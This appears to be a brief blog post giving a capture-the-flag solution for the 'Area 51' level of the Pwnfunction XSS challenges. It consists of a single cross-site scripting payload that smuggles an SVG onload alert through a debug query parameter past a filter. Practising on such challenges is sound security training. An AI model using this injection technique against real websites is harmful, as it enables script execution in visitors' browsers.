---
layout: post
title: 'XSS Pwnfunction | Challenges'
permalink: /ctf/xss-pwnfunction/challenges/
---

# Area 51
{% highlight html %}
?debug=&lt;?php&gt;&lt;&lt;svg%20onload=alert(1337)&gt;
{% endhighlight %}
